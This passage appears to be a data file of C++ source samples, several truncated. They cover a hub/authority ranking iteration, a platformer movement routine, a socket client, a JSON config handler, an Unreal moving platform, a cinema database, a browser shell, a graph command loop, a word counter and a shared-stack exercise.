element of the array and adds it to a matrix \n            for  (int i=0; i<7; i++) {\n                for (int j = 0; j < 7; j++){\n                    A.set_elem(i,j,matrix_data[i*7+j]);\n                }\n            }\n\n        }\n\n\n\n        //run function does the page rank calculations \n        void run(){\n\n            //creating arrays for a, b, a old, and b old\n            double a[7];\n            double b[7];\n            double a_old[7];\n            double b_old[7];\n\n            //variables to hold the max difference between a[i] and a_old[i] - used for terminating condition\n            double max_diff_a;\n            double max_diff_b;\n\n            //esetting terminate to false and setting number of itterations to 0 \n            bool terminate = false;\n            int itterations = 0;\n\n\n            //setting the initial elements of a and b \n            for(int i = 0; i < 7; i++){\n                a[i] = 1.0;\n                b[i] = 1.0;\n            }\n\n\n            //setting values for M and epsilon \n            int M = 100;\n            double e = 1e-6;\n\n\n\n            //big loop that will run for M itterations or until terminating condition is met \n            while(itterations<M && terminate == false){\n\n                //setting elements of a old and b old to that of a and b \n                for(int i = 0; i < 7; i++){\n                    a_old[i] = a[i];\n                    b_old[i] = b[i];\n                }\n\n\n                //setting ai as the sum of Aji * bj\n                for(int i=0; i<7; i++){\n                    double ai_sum = 0.0;\n\n                    for(int j=0; j<7; j++) {\n                        ai_sum += A.get_elem(j,i) * b[j];\n                    }\n\n                    a[i] = ai_sum;      \n                }\n\n\n\n             //setting bi as the sum of Aij * aj\n                for(int i=0; i<7; i++){\n                    double bi_sum = 0.0;\n\n                    for(int j=0; j<7; j++) {\n\n                        bi_sum += A.get_elem(i,j) * a[j];\n\n                    }\n                        b[i] = bi_sum;      \n                }\n\n\n\n\n                //finding the norm of a and b  \n                double norm_a = 0.0;\n                double norm_b = 0.0;\n\n                for(int i =0; i<7; i++){\n                    norm_a += a[i] * a[i];\n                    norm_b += b[i] * b[i];\n                }\n\n                norm_a = abs(sqrt(norm_a));\n                norm_b = abs(sqrt(norm_b));\n\n\n                //dividing a and b by their norms  \n                for(int i =0; i<7; i++){\n                    a[i] = a[i]/norm_a;\n                    b[i] = b[i]/norm_b;\n                }\n\n\n                //setting the max difference between a[i] and a_old[i] to zero \n                max_diff_b = 0; \n                max_diff_b = 0; \n\n\n                //this loop will find the maximum difference between the elements of a/b and a_ol",
    "#include \"player.h\"\n#include \"pulsante.h\"\n#include \"camera.h\"\n#include <iostream>\n#include <cmath>\n#include <vector>\nusing namespace std;\n\n//variabili del player\nstruct gameStuff player = {\n\tplayer.r = { 20,300,46,330 },\n\tplayer.initialPos = player.r,\n\tplayer.vel = 0,\n\tplayer.acc = 0.1,\n\tplayer.initialAcc = 1,\n\tplayer.dec = 0.7,\n\tplayer.jmpDec = 0.5,\n\tplayer.initialJmp = 9,\n\tplayer.velMax = 5,\n\tplayer.jmpPow = 0,\n\tplayer.state = state::idle,\n\tplayer.highJump = false,\n\tplayer.life = 3,\n\tplayer.maxLife = 3,\n\tplayer.immunity = 90,\n\tplayer.initialImmunity = 90\n};\nbool discesa ,jump = false;\nint movementX = 0, movementY = 0;\n\n//gestione movimento del player \nvoid movimentoPlayer(int **&livello, int**&initialLiv, int BLOCK_SIZE, vector<entity>& en, int size, int SCREEN_WIDTH, int livSize, vector<entity>& initialArr, int& score, int SCREEN_HEIGTH, int&tempo)\n{\n\tif (jump) {\n\t\tplayer.jmpPow = player.initialJmp;\n\t\tplayer.state = state::jumping;\n\t\tplayer.highJump = true;\n\t}\n\tmovementX += player.vel; //+ movimento dipendente da entit\u00e0\n\tmovementY += player.jmpPow; //+ movimento dipendente da entit\u00e0\n\tdiscesa = false;\n\t\n\tjump = false;\n\t\n\t//controllo per restaare nello schermo\n\tif (player.r.left + movementX < cam.posX) {\n\t\tmovementX = cam.posX - player.r.left;\n\t\tplayer.vel = 0;\n\t}\n\telse if (player.r.right + movementX >= livSize * BLOCK_SIZE) {\n\t\tmovementX = (livSize * BLOCK_SIZE) - player.r.right;\n\t\tplayer.vel = 0;\n\t}\n\n\t//azioni dipendenti dallo stato\n\tif (player.state == state::idle) {\n\t\tif (D.pressed) {\n\t\t\tplayer.vel += player.initialAcc;\n\t\t}\n\t\telse if (A.pressed) {\n\t\t\tplayer.vel -= player.initialAcc;\n\t\t}\n\t}\n\telse if (player.state == state::walking) {\n\t\tif (player.vel > 0 && !D.held) { \n\t\t\tplayer.vel -= player.dec;\n\t\t}\n\t\telse if (player.vel < 0 && !A.held) {\n\t\t\tplayer.vel += player.dec;\n\t\t}\n\n\t\tif (abs(player.vel) < player.dec && !A.held && !D.held) {\n\t\t\tplayer.vel = 0;\n\t\t}\n\t}\n\telse if (player.state == state::jumping) {\n\t\tplayer.jmpPow -= player.jmpDec;\n\t}\n\n\t//movimento a destra\n\tif (D.held) {\n\t\t//movimento normale\n\t\tplayer.vel += player.acc;\n\t}\n\t//movimento a sinitra\n\tif (A.held) {\n\t\t//movimento normale\n\t\tplayer.vel -= player.acc;\n\n\t}\n\n\t//salto\n\tif (W.pressed && player.state != state::jumping) {\n\t\tplayer.jmpPow = player.initialJmp;\n\t\tplayer.state = state::jumping;\n\t\tplayer.highJump = true;\n\t}\n\t\n\t//salto pi\u00f9 alto\n\tif (W.held && player.state == state::jumping && player.jmpPow > 0 && player.highJump) {\n\t\tplayer.jmpDec = 0.3;\n\t}\n\telse if(player.state == state::jumping){\n\t\tplayer.highJump = false;\n\t\tplayer.jmpDec = 1;\n\t}\n\n\t//controlla la velocit\u00e0 massima\n\tif (player.vel > player.velMax && D.held) {\n\t\tplayer.vel = player.velMax;\n\t}\n\telse if (player.vel < -player.velMax && A.held) {\n\t\tplayer.vel = -player.velMax;\n\t}\n\n\t//collisioni in alto e in basso\n\tif (movementY != 0) {\n\n\t\tif (player.r.left % BLOCK_SIZE < player.r.right % BLOCK_SIZE || player.r.right % BLOCK_SIZE == 0) {\n\n\t\t\t//switch collisione\n\t\t\tswitch (bottomColl(livello[player.r.left / BLOCK_SIZE][(player.r.bottom - movementY) / BLOCK_SIZE], NULL)) {\n\t\t\tcase true:\n\t\t\t\tif ((player.r.bottom / BLOCK_SIZE < (player.r.bottom - movementY) / BLOCK_SIZE || player.r.bottom == ((player.r.bottom - movementY) / BLOCK_SIZE) * BLOCK_SIZE)) {\n\t\t\t\t\tmovementY = player.r.bottom - ((player.r.bottom - movementY) / BLOCK_SIZE) * BLOCK_SIZE;\n\t\t\t\t\tplayer.state = state::idle;\n\t\t\t\t\tplayer.jmpPow = 0;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tlivello[player.r.left / BLOCK_SIZE][(player.r.bottom - movementY) / BLOCK_SIZE] = 0;\n\t\t\t\tscore++;\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tswitch (topColl(livello[player.r.left / BLOCK_SIZE][(player.r.top - movementY) / BLOCK_SIZE], NULL)) {\n\t\t\tcase 3:\n\t\t\t\tlivello[player.r.left / BLOCK_SIZE][(player.r.top - movementY) / BLOCK_SIZE] = 0;\n\t\t\tcase true:\n\t\t\t\tif (player.r.top / BLOCK_SIZE > (player.r.top - movementY) / BLOCK_SIZE) {\n\t\t\t\t\tmovementY = player.r.top - ((player.r.bottom - movementY) / BLOCK_SIZE) * BLOCK_SIZE;\n\t\t\t\t\tplayer.jmpPow = 0;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tlivello[player.r.left / BLOCK_SIZE][(player.r.top - movementY) / BLOCK_SIZE] = 0;\n\t\t\t\tscore++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\telse {\n\n\t\t\tswitch (bottomColl(livello[player.r.left / BLOCK_SIZE][(player.r.bottom - movementY) / BLOCK_SIZE], livello[player.r.left / BLOCK_SIZE + 1][(player.r.bottom - movementY) / BLOCK_SIZE])) {\n\t\t\tcase true:\n\t\t\t\tif ((player.r.bottom / BLOCK_SIZE < (player.r.bottom - movementY) / BLOCK_SIZE || player.r.bottom == ((player.r.bottom - movementY) / BLOCK_SIZE) * BLOCK_SIZE)) {\n\t\t\t\t\tmovementY = player.r.bottom - ((player.r.bottom - movementY) / BLOCK_SIZE) * BLOCK_SIZE;\n\t\t\t\t\tplayer.state = state::idle;\n\t\t\t\t\tplayer.jmpPow = 0;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tif (livello[player.r.left / BLOCK_SIZE][(player.r.bottom - movementY) / BLOCK_SIZE] == 4) {\n\t\t\t\t\tlivello[player.r.left / BLOCK_SIZE][(player.r.bottom - movementY) / BLOCK_SIZE] = 0;\n\t\t\t\t}\n\n\t\t\t\tif (livello[player.r.left / BLOCK_SIZE + 1][(player.r.bottom - movementY) / BLOCK_SIZE] == 4) {\n\t\t\t\t\tlivello[player.r.left / BLOCK_SIZE + 1][(player.r.bottom - move",
    "//\n// Created by beloin on 04/01/24.\n//\n\n#include <arpa/inet.h>\n#include <cstdio>\n#include <cstring>\n#include <iostream>\n#include <netdb.h>\n#include <netinet/in.h>\n#include <string>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <unistd.h>\n\n#include \"client.h\"\n#include \"socket_utils.h\"\n\nusing Network::Client;\n\nint Client::ConnectTo(const std::string &host, const std::string &port) {\n  auto status = ConnectToServer(host, port);\n  return status;\n}\n\nint Client::ConnectToServer(std::string const &host, std::string const &port) {\n  struct addrinfo hints {\n  }, *servinfo, *p;\n  char s[INET6_ADDRSTRLEN];\n  int rv;\n\n  memset(&hints, 0, sizeof hints);\n  hints.ai_family = AF_UNSPEC;\n  hints.ai_socktype = SOCK_STREAM;\n\n  if ((rv = getaddrinfo(host.data(), port.data(), &hints, &servinfo)) != 0) {\n    fprintf(stderr, \"getaddrinfo: %s\\n\", gai_strerror(rv));\n    return 1;\n  }\n\n  for (p = servinfo; p != nullptr; p = p->ai_next) {\n    if ((server_fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) ==\n        -1) {\n      //            perror(\"client: socket\");\n      continue;\n    }\n\n    if (connect(server_fd, p->ai_addr, p->ai_addrlen) == -1) {\n      close(server_fd);\n      //            perror(\"client connect\");\n      continue;\n    }\n\n    break;\n  }\n\n  if (p == nullptr) {\n    fprintf(stderr, \"client: failed to connect\\n\");\n    return 3;\n  }\n\n  inet_ntop(p->ai_family, Utils::get_in_addr((struct sockaddr *)p->ai_addr), s,\n            sizeof s);\n  printf(\"client: connecting to %s with fd %d\\n\", s, server_fd);\n  server_addr = s;\n  freeaddrinfo(servinfo);\n\n  hasConnected = true;\n\n  return 0;\n}\n\nNetwork::Client::~Client() { close(server_fd); }\n\nbool Network::Client::IsConnected() const { return hasConnected; }\n\nvoid Network::Client::disconnect() {\n  hasConnected = false;\n  close(server_fd);\n  server_fd = -1;\n}\n\nssize_t Network::Client::internalSendBytes(std::string const &value,\n                                           size_t size) {\n  return Utils::sbytes(server_fd, (unsigned char *)value.c_str(), size);\n}\n\nssize_t Network::Client::internalSendBytes(char *value, size_t size) {\n  return Utils::sbytes(server_fd, (unsigned char *)value, size);\n}\n\nssize_t Network::Client::internalReadBytes(unsigned char *buf, size_t n) {\n  return Utils::rbytes(server_fd, buf, n);\n}\n",
    "#include \"../includes/JsonHandler.hpp\"\n#include <iostream>\n#include <algorithm>\n\nJsonHandler::JsonHandler(const std::string& filename) : ServiceObject(\"JSON_HANDLER\") {\n    this->filename = filename;\n    createJsonFile();\n}\n\nvoid JsonHandler::createJsonFile() {\n    std::ifstream file(filename);\n    if (!file) {\n        std::ofstream outputFile(filename);\n        std::string data = \"{\";\n        data += createField(\"SRC_PATH\", \"src\");\n        data += createField(\"EXE_NAME\", \"main\");\n        data += createField(\"MAIN_NAME\", \"main\");\n        data += createField(\"RUN_AFTER_BUILD\", \"true\");\n        data += \"\\n}\";\n        outputFile << data;\n        outputFile.close();\n        return;\n    }\n    file.close();\n}\n\nstd::string JsonHandler::createField(const char* fieldname, const char* value) {\n    return \"\\n\\t\\\"\" + std::string(fieldname) + \"\\\": \" + \"\\\"\" + std::string(value) + \"\\\",\";\n}\n\nstd::unordered_map<std::string, std::string> JsonHandler::readJson() {\n    std::ifstream file(filename);\n    std::string jsonData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());\n    return parseJson(jsonData);\n}\n\nstd::unordered_map<std::string, std::string> JsonHandler::parseJson(const std::string& jsonData) {\n    std::unordered_map<std::string, std::string> result;\n    std::string trimmedData = jsonData;\n    trim(trimmedData);\n\n    if (trimmedData[0] != '{' || trimmedData[trimmedData.size() - 1] != '}') {\n        std::cerr << \"Incorrect JSON format\" << std::endl;\n        return result;\n    }\n\n    trimmedData = trimmedData.substr(1, trimmedData.size() - 2);\n    std::string key, value;\n    bool insideString = false;\n    bool parsingKey = true;\n\n    for (size_t i = 0; i < trimmedData.size(); ++i) {\n        char current = trimmedData[i];\n\n        if (current == '\"') {\n            insideString = !insideString;\n            if (!insideString) {\n                if (parsingKey) {\n                    parsingKey = false;\n                } else {\n                    result[key] = value;\n                    key.clear();\n                    value.clear();\n                    parsingKey = true;\n                }\n            }\n            continue;\n        }\n\n        if (!insideString && (current == ':' || current == ',')) {\n            continue;\n        }\n\n        if (insideString) {\n            if (parsingKey) {\n                key += current;\n            } else {\n                value += current;\n            }\n        }\n    }\n\n    return result;\n}\n\nvoid JsonHandler::trim(std::string &str) {\n    str.erase(str.begin(), std::find_if(str.begin(), str.end(), [](unsigned char ch) { return !std::isspace(ch); }));\n    str.erase(std::find_if(str.rbegin(), str.rend(), [](unsigned char ch) { return !std::isspace(ch); }).base(), str.end());\n}",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"componentePlataforma.h\"\n\n// Sets default values\nAcomponentePlataforma::AcomponentePlataforma()\n{\n\t// Set this character to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\tConstructorHelpers::FObjectFinder<UStaticMesh> MeshAsset = ConstructorHelpers::FObjectFinder<UStaticMesh>(TEXT(\"\tStaticMesh'/Game/Geometry/Meshes/1M_Cube.1M_Cube'\"));\n\n\tmeshPlataforma = CreateDefaultSubobject<UStaticMeshComponent>(TEXT(\"Mesh\"));\n\tmeshPlataforma->SetStaticMesh(MeshAsset.Object);\n\tRootComponent = meshPlataforma;\n\n\tFVector NewScale(2.0f, 6.0f, 0.5f); // Cambia estos valores seg\u00fan tus necesidades\n\tSetActorScale3D(NewScale);\n\t// Inicializar variables\n\tvelocidadMovimiento = 200.0f;\n\tmoverPlataformaMedio = false;\n\tmoviendoHaciaObjetivo = true;\n\n}\n\n// Called when the game starts or when spawned\nvoid AcomponentePlataforma::BeginPlay()\n{\n\tSuper::BeginPlay();\n\t\n}\n\n// Called every frame\nvoid AcomponentePlataforma::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n\tif (moverPlataformaMedio) {\n\t\tFVector posicionActual = GetActorLocation();\n\t\tFVector nuevaPosicion;\n\n\t\tif (moviendoHaciaObjetivo) {\n\t\t\tnuevaPosicion = FMath::VInterpConstantTo(posicionActual, posicionObjetivo, DeltaTime, velocidadMovimiento);\n\t\t\tif (nuevaPosicion.Equals(posicionObjetivo, 1.0f)) {\n\t\t\t\tmoviendoHaciaObjetivo = false;\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tnuevaPosicion = FMath::VInterpConstantTo(posicionActual, posicionInicial, DeltaTime, velocidadMovimiento);\n\t\t\tif (nuevaPosicion.Equals(posicionInicial, 1.0f)) {\n\t\t\t\tmoviendoHaciaObjetivo = true;\n\t\t\t}\n\t\t}\n\n\t\tSetActorLocation(nuevaPosicion);\n\t}\n\n}\n\nvoid AcomponentePlataforma::IniciarMovimiento(FVector nuevaPosicionObjetivo)\n{\n\tposicionInicial = GetActorLocation();\n\tposicionObjetivo = nuevaPosicionObjetivo;\n\tmoverPlataformaMedio = true;\n\tmoviendoHaciaObjetivo = true;\n}\n",
    "\n#include \"db.h\"\n#include <string>\n#include <vector>\n\nstatic std::string findRoomName(const int id, const std::vector<Room> &list)\n{\n  for (const auto &room : list)\n  {\n    if (id == room.id)\n    {\n      return room.name;\n    }\n  }\n\n  return \"\";\n}\n\nstatic std::string findMovie(const int id, const std::vector<Films> &list)\n{\n  for (const auto &film : list)\n  {\n    if (id == film.id)\n    {\n      return film.name;\n    }\n  }\n\n  return \"\";\n}\n\nvoid Database::addUser(int id, std::string first_name, std::string last_name, std::string email)\n{\n  users.emplace_back(id, first_name, last_name, email);\n}\n\nvoid Database::addOrder(int id, int screen_id, int order_type_id, bool status, bool paid, bool active)\n{\n  // orders.emplace_back(id, screen_id, order_type_id, status, paid, active);\n}\n\nvoid Database::addSchedule(int id, int film_id, int room_id, int datetime)\n{\n  schedules.emplace_back(id, film_id, room_id, datetime);\n}\n\nvoid Database::addFilm(int id, std::string name, int duration, std::string describe, std::string producer, std::string director)\n{\n  films.emplace_back(id, name, duration, describe, producer, director);\n}\n\nvoid Database::addRoom(int id, std::string name, int seat_no)\n{\n  rooms.emplace_back(id, name, seat_no);\n}\n\nvoid Database::addSeat(int id, int row, int number, int room_id)\n{\n  seats.emplace_back(id, row, number, room_id);\n}\n\nvoid Database::showFilm()\n{\n  for (const auto &element : films)\n  {\n    std::cout << element.id << \",\"\n              << element.name << \",\"\n              << element.producer << \",\"\n              << element.duration\n              << std::endl;\n  }\n}\n\nvoid Database::searchMovieByRoom(const std::string &room_name)\n{\n  for (const auto &schedule : schedules)\n  {\n    if (findRoomName(schedule.room_id, rooms).compare(room_name) == 0)\n    {\n      std::cout << \"film_id: \" << schedule.film_id\n                << \", film_name: \" << findMovie(schedule.film_id, films)\n                << std::endl;\n    }\n  }\n}\n\nbool Database::searchMovieByName(const std::string name)\n{\n  for (const auto &film : films)\n  {\n    if (film.name.compare(name) == 0)\n    {\n      return true;\n    }\n  }\n\n  return false;\n}",
    "#include <iostream>\n#include <fstream>\n#include <SDL2/SDL.h>\n#include <SDL2/SDL_syswm.h>\n#include <d2d1.h>\n#include <dwrite.h>\n#include <wininet.h>\n\n#include <Browser/Renderer.h>\n#include <Browser/Document.h>\n\n#include <myhtml/api.h>\n\n\n#ifdef main\n#undef main\n#endif\n\nBOOL FileExists(LPCTSTR szPath)\n{\n    DWORD dwAttrib = GetFileAttributes(szPath);\n    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));\n}\n\nint main(int argc, char* argv[])\n{\n    if (SDL_Init(SDL_INIT_VIDEO) < 0)\n    {\n        std::cout << \"Failed to initialize the SDL2 library\\n\";\n        return -1;\n    }\n\n    SDL_Window* window = SDL_CreateWindow(\"Browser Jam\",\n        SDL_WINDOWPOS_CENTERED,\n        SDL_WINDOWPOS_CENTERED,\n        1200, 800,\n        SDL_WINDOW_SHOWN);\n\n    if (!window)\n    {\n        std::cout << \"Failed to create window\\n\";\n        return -1;\n    }\n\n    // Get SDL2 window hwnd\n    SDL_SysWMinfo systemInfo;\n    SDL_VERSION(&systemInfo.version);\n    SDL_GetWindowWMInfo(window, &systemInfo);\n\n    HWND hwnd = systemInfo.info.win.window;\n\n    sb::Renderer renderer;\n    renderer.Create(hwnd);\n\n    sb::Document document(&renderer);\n\n    if (!FileExists(\"default.css\"))\n    {\n        std::string defaultStyle = sb::StyleFactory::GetDefaultCSS();\n        document.LoadDefaultStyles(defaultStyle.c_str(), defaultStyle.size());\n    }\n    else\n    {\n        std::ifstream cssFile(\"default.css\");\n        std::string cssContent((std::istreambuf_iterator<char>(cssFile)),\n            std::istreambuf_iterator<char>());\n        document.LoadDefaultStyles(cssContent.c_str(), cssContent.size());\n    }\n\n    std::ifstream htmlFile(\"web.html\");\n    std::string html((std::istreambuf_iterator<char>(htmlFile)),\n                     std::istreambuf_iterator<char>());\n    document.LoadHTML(html.data(), html.size());\n\n    document.InvalidateLayout();\n\n    bool isWindowOpen = true;\n    while (isWindowOpen)\n    {\n        SDL_Event e;\n        while (SDL_PollEvent(&e) > 0)\n        {\n            if (e.type == SDL_QUIT)\n            {\n                isWindowOpen = false;\n            }\n            else if (e.type == SDL_MOUSEMOTION)\n            {\n                document.OnMouseMove(e.motion.x, e.motion.y);\n            }\n            else if (e.type == SDL_MOUSEBUTTONDOWN)\n            {\n                document.OnMouseDown(e.button.x, e.button.y);\n            }\n\n            SDL_UpdateWindowSurface(window);\n        }\n\n        document.Render();\n    }\n\n    document.Shutdown();\n    renderer.Shutdown();\n\n    return 0;\n}",
    "#include \"graph.h\"\n#include <iostream>\n\nint main()\n{\n    std::string command;\n    Graph g;\n    while (std::cin >> command)\n    {\n        if (command == \"LOAD\")\n        {\n            std::string filename;\n            std::cin >> filename;\n            std::fstream fin(filename.c_str());\n            g.load(fin);\n            std::cout << \"success\\n\";\n        }\n        else if (command == \"INSERT\")\n        {\n            int a, b;\n            double d, s;\n            std::cin >> a >> b >> d >> s;\n            try\n            {\n                g.insertEdge(a, b, d, s);\n                std::cout << \"success\\n\";\n            }\n            catch (illegal_exception &e)\n            {\n                std::cout << e.what();\n            }\n        }\n\n        else if (command == \"PRINT\")\n        {\n            int a;\n            std::cin >> a;\n            try\n            {\n                g.print(a);\n            }\n            catch (illegal_exception &e)\n            {\n                std::cout << e.what();\n            }\n        }\n\n        else if (command == \"DELETE\")\n        {\n            int a;\n            std::cin >> a;\n            try\n            {\n                g.remove(a);\n            }\n            catch (illegal_exception &e)\n            {\n                std::cout << e.what();\n            }\n        }\n\n        else if (command == \"PATH\")\n        {\n            int a, b;\n            std::cin >> a >> b;\n            try\n            {\n                g.path(a, b);\n            }\n            catch (illegal_exception &e)\n            {\n                std::cout << e.what();\n            }\n        }\n\n        else if (command == \"TRAFFIC\")\n        {\n            int a, b;\n            double adjustmentFactor;\n            std::cin >> a >> b >> adjustmentFactor;\n            try\n            {\n                g.traffic(a, b, adjustmentFactor);\n            }\n            catch (illegal_exception &e)\n            {\n                std::cout << e.what();\n            }\n\n        }\n\n        else if (command == \"UPDATE\")\n        {\n            std::string filename;\n            std::cin >> filename;\n            std::fstream fin(filename.c_str());\n            g.update(fin);\n        }\n\n        else if (command == \"LOWEST\")\n        {\n            int a, b;\n            std::cin >> a >> b;\n            try\n            {\n                g.lowest(a, b);\n            }\n            catch (illegal_exception &e)\n            {\n                std::cout << e.what();\n            }\n        }\n\n        else if (command == \"EXIT\")\n        {\n            break;\n        }\n    }\n    return 0;\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <algorithm>\r\n#include <chrono>\r\n#include <boost/algorithm/string.hpp>\r\n#include <boost/locale.hpp>\r\n#include <codecvt>\r\n#include <unicode/unistr.h>\r\n#include <unicode/normalizer2.h>\r\n#include <unicode/uchar.h>\r\n#include <unicode/locid.h>\r\n#include \"avltree.h\"\r\n#include \"rbtree.h\"\r\n#include \"hashl.h\"\r\n#include \"hashe.h\"\r\n\r\nusing namespace std;\r\n\r\n// Estrutura que armazena a palavra original e normalizada (sem acentos)\r\nclass WordPair {\r\npublic:\r\n    string without_accents;\r\n    string with_accents;\r\n\r\n    WordPair(string no_accents, string acc) : without_accents(no_accents), with_accents(acc) {}\r\n\r\n    WordPair() : without_accents(\"\"), with_accents(\"\") {}\r\n\r\n    bool operator>(const WordPair& other) const {\r\n        return without_accents > other.without_accents;\r\n    }\r\n\r\n    bool operator<(const WordPair& other) const {\r\n        return without_accents < other.without_accents;\r\n    }\r\n\r\n    bool operator==(const WordPair& other) const {\r\n        return without_accents == other.without_accents;\r\n    }\r\n\r\n    bool operator!=(const WordPair& other) const {\r\n        return without_accents != other.without_accents;\r\n    }\r\n};\r\n\r\n// Sobrecarga do operador de inser\u00e7\u00e3o em stream para a classe WordPair\r\nostream& operator<<(ostream& os, const WordPair& pair) {\r\n    os << pair.with_accents;\r\n    return os;\r\n}\r\n\r\nnamespace std {\r\n    template<>\r\n    struct hash<WordPair> {\r\n        size_t operator()(const WordPair& wp) const {\r\n            // Hash baseado na string 'without_accents'\r\n            return hash<std::string>()(wp.without_accents);\r\n        }\r\n    };\r\n}\r\n\r\n// Fun\u00e7\u00e3o hash personalizada para a classe WordPair\r\nclass WordPairHash {\r\npublic:\r\n    size_t operator()(const WordPair& word) const {\r\n        return hash<string>{}(word.without_accents);\r\n    }\r\n};\r\n\r\n// Classe que remove acentua\u00e7\u00e3o e processa palavras\r\nclass WordProcessor {\r\npublic:\r\n    static icu::UnicodeString remove_accentuation(const icu::UnicodeString& input) {\r\n        UErrorCode errorCode = U_ZERO_ERROR;\r\n        const icu::Normalizer2* normalizer = icu::Normalizer2::getNFDInstance(errorCode);\r\n        \r\n        icu::UnicodeString decomposed;\r\n        normalizer->normalize(input, decomposed, errorCode);\r\n\r\n        icu::UnicodeString no_accents;\r\n        for (int i = 0; i < decomposed.length(); ++i) {\r\n            UChar32 c = decomposed.char32At(i);\r\n            if (!u_hasBinaryProperty(c, UCHAR_DIACRITIC)) {\r\n                no_accents.append(c);\r\n            }\r\n        }\r\n        return no_accents;\r\n    }\r\n\r\n    static WordPair create_word_pair(const icu::UnicodeString& unicode_word) {\r\n        icu::Locale locale(\"pt_BR\");\r\n        icu::UnicodeString lowercased_word = unicode_word; // Cria uma c\u00f3pia mut\u00e1vel\r\n        lowercased_word.toLower(locale); // Chama toLower() na c\u00f3pia\r\n        string with_accents;\r\n        lowercased_word.toUTF8String(with_accents);\r\n\r\n        icu::UnicodeString word_without_accents = remove_accentuation(lowercased_word);\r\n        string without_accents;\r\n        word_without_accents.toUTF8String(without_accents);\r\n\r\n        return WordPair(without_accents, with_accents);\r\n    }\r\n};\r\n\r\n// Fun\u00e7\u00e3o para processar o texto e contar a frequ\u00eancia das palavras\r\ntemplate <typename Dictionary>\r\nvoid process_text(Dictionary& dictionary, fstream& input_file) {\r\n    string line;\r\n    while (getline(input_file, line)) {\r\n        icu::UnicodeString unicode_line = icu::UnicodeString::fromUTF8(line);\r\n        icu::UnicodeString current_word;\r\n\r\n        for (int32_t i = 0; i < unicode_line.length(); ++i) {\r\n            UChar32 character = unicode_line.char32At(i);\r\n            if (u_isalpha(character) || (character == '-' && current_word.length() > 0)) {\r\n                current_word.append(character);\r\n            } else if (current_word.length() > 0) {\r\n                if (current_word.char32At(current_word.length() - 1) == '-') {\r\n                    current_word.truncate(current_word.length() - 1);\r\n                }\r\n                WordPair word_pair = WordProcessor::create_word_pair(current_word);\r\n                if (dictionary.contains(word_pair)) {\r\n                    dictionary.at(word_pair) += 1;\r\n                } else {\r\n                    dictionary.add(word_pair, 1);\r\n                }\r\n                current_word.remove(); // Limpa a palavra para o pr\u00f3ximo uso\r\n            }\r\n        }\r\n\r\n        if (current_word.length() > 0) {\r\n            if (current_word.char32At(current_word.length() - 1) == '-') {\r\n                current_word.truncate(current_word.length() - 1);\r\n            }\r\n            WordPair word_pair = WordProcessor::create_word_pair(current_word);\r\n            if (dictionary.contains(word_pair)) {\r\n                dictionary.at(word_pair) += 1;\r\n            } else {\r\n                dictionary.add(word_pair, 1);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nbool comparator_word_pair(pair<WordPair, int> w1, pair<WordPair, int> w2){\r\n    retu",
    "#include <iostream>\nusing namespace std;\n#include \"Status.h\"\n#include \"SqStack.h\"\n\n//1.\u4e3a\u4e86\u51cf\u5c11\u987a\u5e8f\u6808\u6ea2\u51fa\u60c5\u51b5\u7684\u53d1\u751f\uff0c\u53ef\u4ee5\u8ba9\u4e24\u4e2a\u987a\u5e8f\u6808\u5171\u7528\u4e00\u4e2a\u6570\u7ec4\u5b58\u50a8\u6570\u636e\u5143\u7d20\uff0c\u88ab\u79f0\u4e3a\u5171\u4eab\u6808\u3002\n//\u6b64\u65f6\uff0c\u4e24\u4e2a\u6808\u7684\u6808\u5e95\u5206\u522b\u8bbe\u7f6e\u5728\u6570\u7ec4\u7684\u4e24\u7aef\uff0c\u5165\u6808\u65f6\u6808\u9876\u5411\u6570\u7ec4\u4e2d\u95f4\u79fb\u52a8\uff0c\u5982\u4e0b\u56fe\u6240\u793a.\n//\u5f53\u4e24\u4e2a\u6808\u7684\u6808\u9876\u4f4d\u7f6e\u76f8\u9047\u65f6\u624d\u662f\u6808\u6ee1\u72b6\u6001\u3002\u8bf7\u8bbe\u8ba1\u5171\u4eab\u6808\u7684\u7c7b\u5b9a\u4e49\uff0c\u5b9e\u73b0\u5224\u65ad\u6808\u7a7a\u3001\u5165\u6808\u548c\u51fa\u6808\u7684\u51fd\u6570\u3002\n\n//\u7528\u4e8e\u5143\u7d20\u7684\u8f93\u51fa\ntemplate <class DataType>\nvoid Display(const DataType & e) \n{    cout << e << \"  \";    }\n\nint main(void)\n{\n\tSqStack<int> stack(10);\n\tint data;\n\n\tcout << \"Please enter 5 integers(11 12 13 14 15):\" << endl;//\u8f93\u5165\uff1a11 12 13 14 15\n\tfor(int i=1; i<=5; i++)\n\t{\n\t\tcin >> data;\n\t\tif(stack.Push(1,data) == OVER_FLOW)//-------------\u8c03\u7528\u5171\u4eab\u6808\u5165\u6808\u51fd\u6570\n\t\t{\tcout << \"Stack is full!\" << endl;\texit(0);\t}\n\t}\n\tcout << \"Please enter 4 integers(21 22 23 24):\" << endl;//\u8f93\u5165\uff1a21 22 23 24\n\tfor(int i=1; i<=4; i++)\n\t{\n\t\tcin >> data;\n\t\tif(stack.Push(2,data) == OVER_FLOW)//------------\u8c03\u7528\u5171\u4eab\u6808\u5165\u6808\u51fd\u6570\n\t\t{\tcout << \"Stack is full!\" << endl;\texit(0);\t}\n\t}\n\n\tcout << \"Stack-1 has \" << stack.GetLength(1) << \" elements:\" << endl;//------------\u8c03\u7528\u5171\u4eab\u6808\u6c42\u6808\u957f\u51fd\u6570\n\tstack.Traverse(1,Display);//------------\u8c03\u7528\u5171\u4eab\u6808\u904d\u5386\u51fd\u6570\n\tcout << 